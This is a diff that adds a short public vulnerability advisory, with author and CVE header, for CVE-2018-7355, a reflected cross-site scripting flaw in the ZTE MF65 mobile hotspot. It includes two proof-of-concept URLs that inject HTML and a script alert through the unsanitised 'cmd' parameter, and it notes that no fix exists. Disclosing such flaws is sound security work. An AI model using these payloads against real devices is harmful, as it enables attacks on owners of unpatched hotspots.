@@ -1,0 +1,21 @@
+# Exploit Title: Reflected Cross-Site Scripting on ZTE MF65
+# Date: 01/09/2019
+# Exploit Author: Nathu Nandwani
+# Website: http://nandtech.co/
+# Vendor Homepage: http://support.zte.com.cn/support/news/LoopholeInfoDetail.aspx?newsId=1009483
+# Version: BD_HDV6MF65V1.0.0B05
+# Tested on: Windows 10 x64
+# CVE: CVE-2018-7355
+
+*Description
+
+The Mobile Hotspot having the said firmware version doesn’t sanitize the input argument "cmd" used in the page "/goform_get_cmd_process". A malicious input held by the parameter in the URL could result to client-side script execution or HTML code injection.
+
+*Proof of Concept
+
+http://192.168.0.1/goform/goform_get_cmd_process?multi_data=1&isTest=false&cmd=<b>ZTE_MF65_HTML_INJECT</b>
+http://192.168.0.1/goform/goform_get_cmd_process?multi_data=1&isTest=false&cmd=<script>alert(1)</script>
+
+*Mitigation
+
+None - ZTE recommends upgrading to a new product (http://support.zte.com.cn/support/news/LoopholeInfoDetail.aspx?newsId=1009483)
